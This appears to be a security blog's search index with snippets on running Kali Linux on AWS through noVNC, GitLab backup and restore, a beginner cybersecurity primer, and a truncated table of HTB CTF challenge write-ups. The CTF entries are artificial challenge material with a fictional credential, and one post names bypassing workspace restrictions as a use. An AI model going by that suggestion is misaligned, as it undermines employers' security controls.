[ { "title": "Stream Kali Linux to your Browser from AWS", "url": "/posts/kali-cloud-novnc/", "categories": "Misc, AWS", "tags": "aws, kali, novnc, tigervnc, vnc, websockify", "date": "2022-09-25 10:00:00 -0500", "snippet": "Have you ever wanted to: Stand up an instance of a Kali desktop environment in the cloud to perform testing? Spin up a Linux desktop environment to bypass workspace restrictions? Browse websites anonymously/without attribution? Setup an environment to safely monitor/deploy malware for testing?KASM Workspace is a viable option which streams tools and desktop environments (DE) from Docker containers to your browser. There are some limitations though. Each container defaults to 2 CPUs and 2768MB of memory, so if you want to deploy this for a small team, you would need a sizable instance. Plus there is a max of 5 concurrent sessions for the free community edition.But if you just need a quick Kali or other Linux deployment, I have a solution that uses TigerVNC and NoVNC to get you up in running with no additional client tools needed.Deploy Kali in your Account To start off, login to your AWS account and navigate to the EC2 Dashboard. Then click Launch Instance right below the Resources field. Call the instance whatever you’d like under Names and tags. I’ll just call mine Kali Under Applications and OS Images (Amazon Machine Image), type kali in the search bar and hit Enter The first result should be the official Kali AMI from the AWS Marketplace. Go ahead and select it. There will be a pop-up next. Just hit Continue when it does. Keep the Instance Type as a t2.medium. Under Key pair (login) select a key pair you have. If you do not have one, click on Create new key pair Under Network settings, make sure you are deploying this in a public subnet so you can access and have an IP automatically assigned to your instance. If you need to edit your subnet, click Edit in the upper-right corner of the Network settings box Under Firewall (security groups), you can select select an existing security group that only allows SSH from your IP, else just create one and allow SSH only from your IP Finally, give yourself a little bit more storage. I usually bump it to 25 GiB. Once everything is filled in, click Launch Instance Install the ToolsIt might take a couple of minutes for the instance to be ready, but once it is SSH into your instance with this command:ssh -i &amp;lt;path/to/private_key.pem&amp;gt; -L 8081:localhost:8081 kali@&amp;lt;instance ip&amp;gt;We are going to go ahead and local forward all port 8081 traffic from our computer to the instance on localhost:8081. Once you enter the command, you should be logged in to your Kali instance.There isn’t much to look at here, so we need to give it a desktop environment, some Kali tools, a VNC server, and finally noVNC. We’ll grab the latest package versions from the repos and download the necessary tools:sudo apt updatesudo DEBIAN_FRONTEND=noninteractive apt install -y kali-linux-default kali-desktop-xfce tigervnc-standalone-server novnc The DEBIAN_FRONTEND=noninteractive is added to skip certain installation prompts. It’s also nice when you want to script this out and not have the script break from the prompting. The kali-linux-default installs the core set of Kali tools.This will take several minutes to complete.Setup the EnvironmentOnce finished, go ahead and set your VNC password and verify it. We’re not worried about a view-only password.┌──(kali㉿kali)-[~]└─$ vncpasswdPassword:Verify:Would you like to enter a view-only password (y/n)? nA view-only password is not usedThen we’ll need to create a file needed for VNC. If it doesn’t exist, it gets a little upset. It doesn’t need to have anything in it, so we can just:touch ~/.XresourcesStart the ServicesNow we’ll start the two services. First is TigerVNC:tigervncserver -xstartup /usr/bin/xfce4-session -localhostThis will start the VNC server and expose the VNC port on the localhost.Finally we’ll start noVNC:websockify -D --web /usr/share/novnc/ 8081 localhost:5901This will expose port 8081 on the host. Being as how this is on an instance with a security group only allowing SSH traffic from your IP, it’s not a big deal. If you are deploying this in your home lab and would like to only expose this port to localhost and not have to deal with iptables, change websockify -D --web /usr/share/novnc/ 8081 localhost:5901 to websockify -D --web /usr/share/novnc/ localhost:8081 localhost:5901ProfitNow just go to your browser and type:http://localhost:8081/vnc.html?resize=remoteThe resize=remote will make the screen automatically resize based on your dimensions of your browser. Click on Connect and you’ll be prompted for the VNC password you created.A Quick ScriptI scripted this process out to generate the necessary files, create a random password for the VNC server, and display the required URL to access the desktop environment. To setup: Create the script file: vim script.sh Add the following contents: #!/bin/bashmypasswd=$(strings /dev/urandom | grep -o &#39;[[:alnum:]]&#39; | head -n 30 | tr -d &#39;\\n&#39;; echo)sudo apt updatesudo DEBIAN_FRONTEND=noninteractive apt install -y kali-linux-default kali-desktop-xfce tigervnc-standalone-server novncumask 0077mkdir -p &quot;$HOME/.vnc&quot;chmod go-rwx &quot;$HOME/.vnc&quot;vncpasswd -f &amp;lt;&amp;lt;&amp;lt; &quot;$mypasswd&quot; &amp;gt; &quot;$HOME/.vnc/passwd&quot;touch ~/.Xresourcestigervncserver -xstartup /usr/bin/xfce4-session -localhostwebsockify -D --web /usr/share/novnc/ localhost:8081 localhost:5901printf &quot;\\nhttp://localhost:8081/vnc.html?resize=remote&amp;amp;password=${mypasswd}\\n\\n&quot; Make the script executable: chmod +x script.sh Run the script: ./script.sh After-Thoughts You can provide self-signed certs to give websockify TLS support. websockify - github Once everything is setup on Kali how you like (ie. configuring kali tools), create your own AMI based off of the instance. Then, you’ll never have to worry about setting everything up again, and you can just deploy an instance with that custom AMI. AWS Doc You could create a CloudFormation or Terraform script to spin something like this up automatically whenever you need it. This can be done on other flavors of Linux. The one I’ve found for Ubuntu utilizes an xstartup file. This site shows how you can setup VNC with different Desktop Environments for Ubuntu. When you create the xstartup file, you can ignore using the --xstartup flag in the tigervncserver command. Sidenote: If you want to use Firefox in Ubuntu with VNC, follow this guide to remove Firefox from the snap store and install Firefox from the apt repository [ link ]. If you have a high definition display, the resize=remote might make it hard to view the contents of the desktop. On the left sidebar you can click Settings → Scaling Mode: Local Scaling, then change the resolution on the virtual desktop. It’s not great, but it works." }, { "title": "Backup/Restore GitLab", "url": "/posts/backup-restore-gitlab/", "categories": "Misc, GitLab", "tags": "gitlab, aws, s3, docker, docker-compose, gitlab-ctl", "date": "2022-06-04 10:00:00 -0500", "snippet": "Do you have a small GitLab container running on an instance in AWS for yourself or a small team? Have you ever needed to back-up GitLab and move it to another machine wether that be on another instance or on-prem? The following are instructions on how to back-up GitLab in a container to an AWS S3 bucket, deploy a container of GitLab in another environment, pull down the backup, and finally restore the back-up on the new machine.The instructions should still work if you manually installed GitLab on a machine. I would recommend at least having it deployed with Docker Compose, because it’s way easier to update. My example Docker Compose file in Step 6 ensures GitLab always stays up-to-date without having to manually do it.Step 1. Create S3 BucketCreate an S3 bucket. The architecture diagram shows you can create multiple buckets for different GitLab objects. In this case, we’re just worried about setting up a backup bucket.Step 2. Create an IAM Policy for the Instance that is housing GitLab.Using GitLab’s Documentation, create an EC2 instance role for GitLab using the provided example policy. If all you are worried about is backups, just plug the backup bucket ARN into the resource.Example Policy:{ &quot;Version&quot;: &quot;2012-10-17&quot;, &quot;Statement&quot;: [ { &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: [ &quot;s3:PutObject&quot;, &quot;s3:GetObject&quot;, &quot;s3:DeleteObject&quot;, &quot;s3:PutObjectAcl&quot; ], &quot;Resource&quot;: &quot;arn:aws:s3:::gl-backup-example-bucket/*&quot; }, { &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: [ &quot;s3:ListBucket&quot;, &quot;s3:AbortMultipartUpload&quot;, &quot;s3:ListMultipartUploadParts&quot;, &quot;s3:ListBucketMultipartUploads&quot; ], &quot;Resource&quot;: &quot;arn:aws:s3:::gl-backup-example-bucket&quot; } ]}Once the policy has been created, attach the EC2 instance role to the instance.Step 3. Modify gitlab.rb to upload backups to S3 Drop into the the container (if you are using Docker): sudo docker exec -it &amp;lt;container-name/id&amp;gt; /bin/bash Modify the gitlab.rb file: vi /etc/gitlab/gitlab.rb Add the following to the gitlab.rb file: gitlab_rails[&#39;backup_upload_connection&#39;] = { &#39;provider&#39; =&amp;gt; &#39;AWS&#39;, &#39;region&#39; =&amp;gt; &#39;us-gov-west-1&#39;, &#39;use_iam_profile&#39; =&amp;gt; true } gitlab_rails[&#39;backup_upload_remote_directory&#39;] = &#39;gl-backup-example-bucket&#39; Once added, reconfigure GitLab: gitlab-ctl reconfigure Step 4. Create a Backup Once the reconfigure has completed, you can create a backup from within the container: gitlab-backup create SKIP=registry OR you can run the command from Docker: sudo docker exec -it gitlab gitlab-backup create SKIP=registry Note: I skip the registry to avoid an error I received when trying to restore from backup. It got mad at me for not having a registry.gz file, or something like that. Since I wasn’t using GitLab’s registry, I just skipped it hence the SKIP=registry Once the command finishes, check the S3 bucket for a backup file. This command will also create a backup file in /var/opt/gitlab/backups/ Step 5. Manually Backup the gitlab-secrets.json and gitlab.rb Files When you create a backup, it does not backup the gitlab-secrets.json or gitlab.rb files. It even tells you you must back those two files up manually. I found that it was easier to push those files to the same bucket as the backups and pull them to the new instance.In our case, using Docker… Copy the files from the mounted Docker volumes: sudo cp /srv/gitlab/config/gitlab.rb /srv/gitlab/config/gitlab-secrets.json . Move those files to your bucket: aws s3 cp gitlab.rb s3://gl-backup-example-bucket/ aws s3 cp gitlab-secrets.json s3://gl-backup-example-bucket/ Step 6. Restore from a Backup Whether you need to restore from a failure or move your GitLab to another instance, here is where you will restore the backup.ALSO the following commands assume you are running GitLab in a container. So on your new server: install docker, start docker, and install docker-compose. Next create a docker-compose.yaml file. Here is a sample one I use: version: &#39;3.6&#39;services:web: image: &#39;gitlab/gitlab-ee:latest&#39; container_name: gitlab restart: always hostname: &#39;example.gitlab.com&#39; ports: - &#39;80:80&#39; - &#39;443:443&#39; - &#39;6222:22&#39; volumes: - &#39;/srv/gitlab/config:/etc/gitlab&#39; - &#39;/srv/gitlab/logs:/var/log/gitlab&#39; - &#39;/srv/gitlab/data:/var/opt/gitlab&#39;watchtower: image: containrrr/watchtower container_name: watchtower restart: always volumes: - /var/run/docker.sock:/var/run/docker.sock command: --interval 300 --cleanup Watchtower is here to check for new GitLab images every 5 minutes and deploys them with the same configs as well as clean up old images. Spin up the containers: sudo docker-compose up -d Wait for the GitLab container to be healthy: sudo watch docker ps Once healthy, pull down the gitlab.rb file and place it into the container, chown it to root, and reconfigure: aws s3 cp s3://gl-backup-example-bucket/gitlab.rb . sudo docker cp gitlab.rb gitlab:/etc/gitlab/ sudo docker exec -it gitlab chown root: /etc/gitlab/gitlab.rb sudo docker exec -it gitlab gitlab-ctl reconfigure Once the reconfigure is finished, pull down the latest backup, place it into the container and chown it to git: aws s3 cp s3://gl-backup-example-bucket/11493107454_2018_04_25_10.6.4-ce_gitlab_backup.tar . sudo docker cp 11493107454_2018_04_25_10.6.4-ce_gitlab_backup.tar gitlab:/var/opt/gitlab/backups/11493107454_2018_04_25_10.6.4-ce_gitlab_backup.tar sudo docker exec -it gitlab chown git:git /var/opt/gitlab/backups/11493107454_2018_04_25_10.6.4-ce_gitlab_backup.tar Stop the puma and sidekiq services and confirm the services are down: sudo docker exec -it gitlab gitlab-ctl stop puma sudo docker exec -it gitlab gitlab-ctl stop sidekiq sudo docker exec -it gitlab gitlab-ctl status Restore the backup. Remember to ignore the _gitlab_backup.tar: sudo docker exec -it gitlab gitlab-backup restore BACKUP=11493107454_2018_04_25_10.6.4-ce Step 7. Load the gitlab-secrets.json file and Restart Copy the file into the container, chown it root, and reconfigure: aws s3 cp s3://gl-backup-example-bucket/gitlab-secrets.json . sudo docker cp gitlab-secrets.json gitlab:/etc/gitlab/ sudo docker exec -it gitlab chown root: /etc/gitlab/gitlab-secrets.json sudo docker exec -it gitlab gitlab-ctl reconfigure Restart GitLab: sudo docker exec -it gitlab gitlab-ctl restart And for safe measure, just restart the container: sudo docker restart gitlab The gitlab-ctl restart might be irrelevant with restarting the container. I didn’t double-check to see if it was necessary. Step 8. Profit" }, { "title": "Intro to Cybersecurity", "url": "/posts/getting-started-cybersecurity/", "categories": "Misc", "tags": "intro", "date": "2022-05-19 18:30:00 -0500", "snippet": "Intro to Cyber SecurityCyber Security continues to be an ever-growing, in-demand career field as everything in our lives transition to computers. SANS has a list of some careers that branch off of cyber security: SANS 20 Coolest Careers in Cybersecurity link: Threat Hunter Red Teamer/Penetration Tester Digital Forensics Analyst Purple Teamer Malware Analyst CISO/ISO or Director of Security Blue Teamer - All Around Defender Security Architect &amp;amp; Engineer Incident Response Team Member Cyber Security Analyst/Engineer OSINT Investigator/Analyst Technical Director Intrusion Detection/ (SOC) Analyst Security Awareness Officer Vulnerability Researcher &amp;amp; Exploit Developer Application Pen Tester DevSecOps Engineer Media Exploitation Analyst I’ve been asked before what one should learn to get started in this career field, so I’ve broken down some basic pillars for getting started. As you continue to advance in learning, you can find an area that interests you more and shift your focus to that. There are tons of online resources available.Learn LinuxMost servers on the internet are some *nix (Unix-like) variety. When encountering them, having a foundational knowledge of knowing how to move around in that environment is paramount. For instance if you are doing an investigation on a compromised Linux web-server, you need to know the file system layout (Filesystem Hierarchy Standard), what commands to run to search for artifacts, or how to do a bit-by-bit copy of the server to preserve it as evidence. If you were approaching that web-server from an adversarial standpoint, once you compromise the server you would need to know how to move laterally on the device and how to exploit the server further to escalate your privileges to eventually gain root access. You can’t do any of that without a foundational knowledge of Linux.Some questions to get you started: How do I move between folders (directories)? How do I list the contents of a folder (directory)? How do I learn more about a command and what arguments I can give it? (manual pages)RecommendationsI enjoyed Linux Basics for Hackers: Getting Started with Networking, Scripting, and Security in Kali (Publisher and Amazon). It’s an easy read and breaks everything down so it isn’t too overwhelming. It instructs you on how to setup a Kali Linux Virtual Machine using VirtualBox so you can practice along with the chapters.Another resource which I’ll probably have in all of my recommendations is TryHackMe. Their content is very beginner friendly with easy to follow guides and sections. You can run in-browser machines to solve the challenges or use your own machine and VPN into their network to practice. As far as learning Linux, they have a Linux Fundamentals module.As you get more comfortably with Linux and are looking for something a little more challenging, check out OverTheWire and start with Bandit.Learn WindowsMost users and corporate environments use Windows. It’s the most popular operating system in the world. As such with most endpoints being Windows, you should be able to navigate through a Windows filesystem, know how to spot suspicious processes and files, and how to run commands against multiple machines (WMIC, PSExec, and PowerShell).Something cool that Windows has released/supported is called Windows Subsystem for Linux (WSL). It’s available in latest version of Windows and allows you to run Linux commands on your Windows machine without the need for a VM (link).RecommendationsTry to translate the commands you learned with Linux to Windows command line (for example, how to navigate directories, search for a file, creating a file, appending to a file, scheduling tasks, etc).As for learning platforms, TryHackMe has a fundamentals module Windows FundamentalsLearn NetworkingThis feels like one of the most crucial pieces of learning in this field. Learn the different protocols (HTTP, HTTPS, SSH, FTP, SMB, etc.). Learn how they work. Look at packet captures (pcaps) of their traffic. Learn what is normal and what isn’t. Understanding how traffic is routed and how you can proxy and manipulate that traffic will help in both blue and red team engagements.A few questions you can ask to get started: When I type in “google.com” in my browser, how does my browser know where to go? If I log-in to a website, how does it “remember” me? What is the difference between a public IP and a private IP? How does an e-mail get sent? What are the headers in an e-mail for (including DKIM and DMARC)?RecommendationsIf you are a fan of books, I’d recommend Practical Packet Analysis: Using Wireshark to Solve Real-World Network Problems (Publisher and Amazon). The author provides sample packet captures (pcaps) for each section so you can follow along with the analyses.Of course, TryHackMe has a few modules: Network Fundamentals Network Security How the Web WorksLearn ScriptingThis isn’t necessarily a mandatory thing to learn. But as you move through machines, you’ll find yourself repeating the same commands over and over. This is where scripting can come into play. Python is a very popular, cross-platform language that is easy to learn. Bash scripting can come in handy if the device you’re on doesn’t have Python. And lastly, PowerShell is a must for Windows systems. It’s a scripting language built on top of Microsoft .NET technology. A lot of malware uses PowerShell to execute commands against a machine. PowerShell logs can be very valuable if a company has them enabled. You can also use batch scripts in Windows as well.RecommendationsThere are many Python books available if you prefer books. If you check Humble Bundle every now and then, they’ll have some Python or general Cybersecurity book bundles.A list of Python books offered by No Starch Press can be found here.For PowerShell, there is PowerShell for Sysadmins (Publisher and Amazon)And naturally TryHackMe offers several modules and rooms: Scripting for Pentesters, Bash Scripting, Python BasicsLearn the Basics of “Hacking”Learn the process of scanning a target, assessing the target for vulnerabilities, exploiting the target, and escalating ones privileges on the target. As you continue to learn more about exploitation, you’re methodology will become more focused and defined. I’d recommend keeping good notes about services you’ve exploited, how you found them, and what tools/commands you used to exploit them.Also learn about Open Web Application Security Project (OWASP) Top 10. These are a consensus of the most critical security risks to web applications. There are a lot of web applications out there and as such are rife with vulnerabilities. You can also use this information to pursue Bug Bounties. If you were to find anything within the scope of a companies Bug Bounty program, you can report the vulnerability to the respective companies or bug bounty platform (ie. HackerOne or BugCrowd) and receive some form of compensation or recognition.RecommendationsIf you’d like to stick with TryHackMe, they have Learning Paths which take a lot of these recommended modules and rooms and keeps track of your progress on said path. A few of these learning paths include: Introduction to Cyber Security Jr. Penetration Tester Complete Beginner Web Fundamentals Cyber DefenseYouTube has some great content for learning: For breakdowns on HackTheBox machines, I’d recommend watching IppSec’s channel. PwnFunction does a great job explaining common vulnerabilities into easily digestible, visual explanations. LiveOverflow also offers the same visual breakdowns and explanations across a wider range of topics.For OWASP vulnerabilities I’d recommend PortSwigger Academy. It’s free and they offer labs which reinforce the concepts they teach you.I’d also recommend finding some Capture the Flag (CTF) events. They give you a way to practice what you’ve learned and give you opportunities to learn some new things as well. There is a YouTuber named JohnHammond who goes over a lot of CTF challenges. You can get a feel for how CTFs work from him." }, { "title": "HTB Cyber Apocalypse CTF - Table of Write-ups", "url": "/posts/htb-ca-2022-writeup-table/", "categories": "CTF, HTB CA 2022", "tags": "ctf, htb, write-ups", "date": "2022-05-15 14:30:00 -0500", "snippet": "I’m hosting the files I was able to get on DropBox in case anyone wanted to try the challenges on their own after the fact. I’ll add more write-ups as I find them.Web Challenge Name Difficulty Description Files Links Kryptos Support ★☆☆☆ The secret vault used by the Longhir’s planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?   GelzkiHansuuuuuuuuuuAlmond Force (Video)Hilbert (Video)skyfrmeispiLazyTitan33s1n1st3rhussienmisbahdamaideckalifornia909breakingbreakpointss4yhiiM0ngihenry132109Rogue-1heinandretwc1rcle BlinkerFluids ★☆☆☆ Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus’ home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization’s one of the HR department tools and needs your help to get into their server. Can you help him? Download GelzkiHansuuuuuuuuuuAlmond Force (Video)Hilbert (Video)meispiLazyTitan33GordonOusdamaidecbreakingbreakpointss4yhiiM0ngihenry132109heinandretwc1rclewatchdogr4bb1t Amidst Us ★☆☆☆ The AmidstUs tribe is a notorious group of sleeper agents for hire. We have plausible reasons to believe they are working with Draeger, so we have to take action to uncover their identities. Ulysses and bonnie have infiltrated their HQ and came across this mysterious portal on one of the unlocked computers. Can you hack into it despite the low visibility and get them access? Download GelzkiAlmond Force (Video)rewdogLazyTitan33GordonOusbreakingbreakpointsM0ngihenry132109twc1rclewatchdog@brandonwils Intergalactic Post ★☆☆☆ The biggest intergalactic newsletter agency has constantly been spreading misinformation about the energy crisis war. Bonnie’s sources confirmed a hostile takeover of the agency took place a few months back, and we suspect the Golden Fang army is behind this. Ulysses found us a potential access point to their agency servers. Can you hack their newsletter subscribe portal and get us entry? Download GelzkiM0ngihenry132109watchdog Acnologia Portal ★★☆☆ Bonnie has confirmed the location of the Acnologia spacecraft operated by the Golden Fang mercenary. Before taking over the spaceship, we need to disable its security measures. Ulysses discovered an accessible firmware management portal for the spacecraft. Can you help him get in? Download pich4yaGordonOusjameslowthersecurajibreakingbreakpointswatchdog Spiky Tamagotchy ★★☆☆ Captain Spiky comes from a rare species of creatures who can only breathe underwater. During the energy-crisis war, he was captured as a war prisoner and later forced to be a Tamagotchi pet for a child of a general of nomadic tribes. He is forced to react in specific ways and controlled remotely purely for the amusement of the general’s children. The Paraman crew needs to save the captain of his misery as he is potentially a great asset for the war against Draeger. Can you hack into the Tamagotchi controller to rescue the captain? Download pich4yabreakingbreakpoints Red Island ★★☆☆ The Red Island of the glowing sea is a proud tribe of species that can only see red colors. Hence every physical item, picture, and poster on this island is masked with red colors. The Golden Fang army took advantage of the color weakness of the species of Red Island to smuggle illegal goods in and out of the island behind the ministry’s back. Without an invitation, it’s impossible to get entry to the island. So we need to hack the ministry and send us an invite from the inside to stop the atrocities of Draeger’s men on this island. As always, Ulysses, with his excellent recon skills, got us access to one of the portals of the Red Island ministry. Can you gain access to their networks through this portal?   Mattia Codato damaidecjamesasec Mutation Lab ★★☆☆ One of the renowned scientists in the research of cell mutation, Dr. Rick, was a close ally of Draeger. The by-products of his research, themutant army wrecked a lot of havoc during the energy-crisis war. To exterminate the leftover mutants that now roam over the abandoned areas on the planet Vinyr, we need to acquire the cell structures produced in Dr. Rick’s mutation lab. Ulysses managed to find a remote portal with minimal access to Dr. Rick’s virtual lab. Can you help him uncover the experimentations of the wicked scientist?   GelzkiHilbert (Video)skyfrrewdogLazyTitan33s1n1st3rdamaidecbreakingbreakpointshenry132109 Genesis Wallet ★★★☆ To weaken the Golden Fang army, we must cut off their funding of the Genesis coins. Ulysses managed to perform a phishing attack against one of the financial operators of the mercenary and retrieved the login credentials “icarus:FlyHighToTheSky” for the Genesis wallet. However, the account is protected with 2FA. Can you hack into this renowned intergalactic wallet and move their funds to your account? Download Gelzkipich4yabreakingbreakpoints Genesis Wallet’s Revenge ★★★☆ The previous attempts to get access to the financial operator’s account of the Golden Fang army failed, and the Genesis platform went under heavy security modifications to patch any potential issues it might have. Luckily, the operator’s credentials remained the same “icarus:FlyHighToTheSky”. Can you bypass the 2FA protection and hack into the wallet account of that operator to drain his balance? Download h1pmnhbreakingbreakpoints CheckpointBots ★★★☆ The evergreen Earth was seized by the nomadic tribes of the Glowing Sea during the energy crisis war that turned beautiful Japan into a war-torn autonomous region of militarized activities. Even after Draeger’s defeat, the once proud nation of Japan was still under the captivity of the nomadic tribes and is currently at war with other regions. At the request of the Earth liberation front, Ulysses and the crew decided to help infiltrate their headquarters in the Kyoto region. Can you disarm the Checkpoint bots that roam around the city of Kyoto? Download   Pwn Challenge Name Difficulty Description Files Links Space Pirate: Entrypoint ★☆☆☆ D12 is one of Golden Fang’s missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further. Download siunam321skyfrrewdogroderickchanhenry132109heinandre Space pirate: Going Deeper ★☆☆☆ We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. Can you disable the mechanisms and take control of the Admin Panel? Download rewdogpizzapablo666Cjreekrafiinaroderickchanhenry132109heinandretwc1rcle Space pirate: Retribution ★☆☆☆ We got access to the Admin Panel! The last part of the mission is to change the target location of the missiles. We can probably target Draeger’s HQ or some other Golden Fang’s spaceships. Draeger’s HQ might be out of the scope for now, but we can certainly cause significant damage to his army. Download roderickchanCjreek Vault-breaker ★☆☆☆ Moneymaker, Big Boy Bonnie has a crew of his own to do his dirty jobs. On a tiny little planet a few lightyears away, a custom-made vault has been found by his crew. Something is hidden inside it, can you find out the way it works and bring it to Bonnie? Download roderickchan Fleet Management ★☆☆☆ Reading through an Underground Intergalactic hacking forum Bonnie stumbles upon a post talking about a backdoor in the Gold Fang’s Spaceship Fleet Management System. There is a note about a twist added by the author to prevent anyone from using the backdoor. Will Bonnie achieve to gain access to Gold Fang’s internal network and retrieve precious documents? Download roderickchan Hellbound ★★☆☆ In one of Bonnie’s first missions, a helpless dog was injured by the laser guns during the fierce fight and was unable to move and escape the war scene. Bonnie took the dog and fled the battle, but not much he could do to help the poor dog. Some of the crew’s doctors and engineers, made some mutations and added artificial parts to the dog, making it a living war machine under Bonnie’s control. After the last fight, something hit the manufactured parts, making them malfunction and driving the dog berserk. Can you fix them and make the dog loyal under Bonnie’s control again? Download roderickchanCryptoCat (Video) Bon-nie-appetit ★★☆☆ After the successful hijacking of the D12 spaceship during the Space Pirate mission, the crew managed to place a signal transmitter on a vending machine that the Golden Fang’s members are using to order food from the Supplier Spacecraft of Draeger. Golden Fang’s crew’s favorite food contains a secret ingredient called “Little Green People”, which we do not have further info about. The signal passes through many satellites before it reaches the Supplier, so it won’t be easy to track the device and the leaked signal. Can you take advantage of it and get control of the Supplier? Download roderickchan Trick or Deal ★★☆☆ Bonnie and his crew arrive on planet Longhir to get equipped with the latest weaponry, but the intergalactic weapon dealer refuses to sell them weapons because he has a trade agreement with Draeger, the Alien Overlord, thus Bonnie has to employ his neat exploitation tricks to persuade the dealer into selling them weapons. Download roderickchan Sabotage ★★★☆ Draeger ordered Thanatos, the destroyer under the Golden Fang flag, to annihilate our defense base with a super laser beam capable of destroying whole planets. Bonnie and his crew go for a sabotage-suicide mission in order to stop Thanatos before it’s too late. Download roderickchan Once and for all ★★★☆ This is the final countdown, our last chance to face the evil galaxy overlord Draeger. No mistakes are allowed, we need to give it everything we have to build the finest, most powerful weapon ever made to defeat him. Bonnie assembled his crew to discuss and craft it with every resource possible. Will we manage to make it? Download n4smroderickchan Crypto Challenge Name Difficulty Description Files Links Android-in-the-Middle ★☆☆☆ Years have passed since Miyuki rescued you from the graveyard. When Virgil tells you that he needs your help with something he found there, desperate thoughts about your father and the disabilities you developed due to the disposal process come to mind. The device looks like an advanced GPS with AI capabilities. Riddled with questions about the past, you are pessimistic that you could be of any value. After hours of fiddling and observing the power traces of this strange device, you and Virgil manage to connect to the debugging interface and write an interpreter to control the signals. The protocol looks familiar to you. Your father always talked about implementing this scheme in devices for security reasons. Could it have been him? Download kisanakkkkkTell No Talesjontay999willwam845Hilbert (Video)an00brektn Jenny From The Block ★☆☆☆ Intrigued by the fact that you have found something your father made, and with much confidence that you can be useful to the team, you rush excitedly to integrate “Jenny” into the spaceship’s main operating system. For weeks, everything went smoothly, until you ran into a meteor storm. Having little to no data of training, the AI is now malfunctioning. Ulysses freaks out because he can no longer control the spaceship due to the AI overriding his manual commands. Big banging noises terrify your crew members. Everything is shaking. It’s time to act. Do you think you can temporarily shut down “Jenny” until she becomes more sophisticated? Download Tell No Talesjontay999willwam845an00brektnkisanakkkkk The Three-Eyed Oracle ★☆☆☆ Feeling very frustrated for getting excited about the AI and not thinking about the possibility of it malfunctioning, you blame the encryption of your brain. Feeling defeated and ashamed to have put Miyuki, who saved you, in danger, you slowly walk back to the lab. More determined than ever to find out what’s wrong with your brain, you start poking at one of its chips. This chip is linked to a decision-making algorithm based on human intuition. It seems to be encrypted… but some errors pop up whencertain user data is entered. Is there a way to extract more information and fix the chip? Download Tell No Talesjontay999an00brektn How The Columns Have Turned ★☆☆☆ A day before the memorial of the Dying Sun, Miyuki began talking about Broider, a death squad commander and a friend of Paulie’s capturer. He would be a party guest at Viryr’s palace. After examining a lot of different scenarios, Miyuki came up with a plan in which Paulie would lure Broider to a secluded location so the group could capture him. Following the plan, a wild chase had just begun when the two looked each other in the eye. After an extremely risky maneuver, Paulie outwitted Broider and led him into an alley in Vinyr’s undercity. The plan was a success. Your squad had managed to capture Broider and bring him back to the ship. After hours of interrogation by Ulysses, he revealed the final key to a series of encrypted messages. Can you find a way to decrypt the others? The flag consists entirely of uppercase characters and has the form HTB{SOMETHINGHERE}. You still have to add the {} yourself. Download Tell No Taleswillwam845C4rm3l0Hilbert (Video)an00brektn MOVs Like Jagger ★★☆☆ While following the breadcrumbs from the secret messages you managed to recover from Broider, Bonnie gathered more information from his well trusted “Tsirakia” and found out that the messages were about the destinations of a STS (Space Transportation Ship). The STS, named “Paketo”, is a notoriously large spaceship that transports military supplies for the Golden Fang mercenary army. After spending some time observing the seemingly random trajectory of Paketo, you and Paulie manually plotted the delivery locations and realized that the STS’s orbit forms an elliptic curve. Your spaceship’s advanced technology GPS has calculated the exact parameters of the curve. Can you somehow predict Paketo’s final destination and hijack it? Download jontay999 Find Marher’s Secret ★★☆☆ After figuring out the destination of Paketo, Ulysses devised a hijacking plan to sabotage the delivery of the military equipment. Despite efforts, the plan did not work as expected and a battle ensued. Since your movement was restricted, Miyuki ordered you to hide behind a huge container with unknown contents in fear of taking more damage. Seeing all the killings of the manipulated cyborgs (code named: Marher) brought back memories of your time on the graveyard planet. Suddenly, a cyborg appeared in front of you. Unable to move from the shock, death was all you could think about. Fortunately, Ulysses manages to save you at the last second by knocking the cyborg unconscious. You bring it back to the laboratory to use some of its functionalities to repair parts of your brain. You discover that all of its components are encrypted. Can you find a way to extract the secret key? Download jontay999 Memory Acceleration ★★☆☆ While everyone was asleep, you were pushing the capabilities of your technology to the max. Night after night, you frantically tried to repair the encrypted parts of your brain, reversing custom protocols implemented by your father, wanting to pinpoint exactly what damage had been done and constantly keeping notes because of your inability of forming new memories. On one of those nights, you had a flashback. Your father had always talked about a new technology and how it would change the galaxy. You realized that he had used it on you. This technology dealt with a proof of a work function and decentralized networks. Along with Virgil’s help, you had a “Eureka!” moment, but his approach, brute forcing, meant draining all your energy. Can you find a quicker way to validate new memory blocks? Download willwam845 Down the Rabinhole ★★☆☆ Miyuki, wanting to find out more evidence about Draeger and his escape, planned a space trip to the maximum security black hole where Draeger was held captive. Problems though soon arose as the approach to the black hole caused distortions on your electronics. Memories of the traumatic experience you had when the Council guards brutally ripped you from your father’s hands painfully flooded your mind. The one thing you never forgot was the signal he sent you while you were still within range of the planet. Only two packets got through, but since they were encrypted you couldn’t figure out what they were. Now, being more determined than ever to find your father, having gained experience during the missions with the squad, you know that it’s time to decrypt the signal. Download jontay999willwam845Hilbert (Video)chovid99 Mind In The Clouds ★★★☆ Mysterious kidnappings of Longhir’s best scientists began to occur ever since Draeger gained influence in the council, a fact known to everyone in the troupe. Virgil was certain that these kidnappings had something to do with Meiro and the neuro-linked technology he helped develop. He also knew that Draeger wanted to experiment by uploading minds to the cloud and then connecting them to androids. These thoughts ran through Miyuki’s mind while she was searching for clues in the prison. After finding no signs that indicated a physical escape, she concluded that Draeger hadn’t actually escaped. Instead, he had somehow initiated a backup version of his mind, which he had downloaded into an unknown body. Upon hearing Miyuki’s conclusions, the team was in a rather charged mood. As you sit in the corner, almost paralyzed by the crippling news, you can only think of one thing: Is your father in the cloud/s too? Download willwam845chovid99 One Step Closer ★★★☆ Reading out loud Danbeer’s thoughts from the cloud server shocked everyone. 